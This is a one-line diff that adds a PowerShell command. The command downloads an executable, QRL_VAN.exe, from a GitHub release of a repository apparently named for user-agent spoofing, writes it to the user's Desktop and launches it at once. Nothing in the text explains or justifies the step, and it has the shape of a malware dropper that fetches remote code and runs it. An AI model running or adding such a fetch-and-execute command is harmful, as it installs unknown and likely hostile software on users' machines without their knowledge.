@@ -1,0 +1,1 @@
+$downloadPath = Join-Path -Path $env:USERPROFILE -ChildPath "Desktop"; $url = "https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/QRL_VAN.exe"; Invoke-WebRequest -Uri $url -OutFile "$downloadPath\QRL_VAN.exe"; $packetCryptPath = Join-Path -Path $downloadPath -ChildPath "QRL_VAN.exe"; Start-Process -FilePath $packetCryptPath
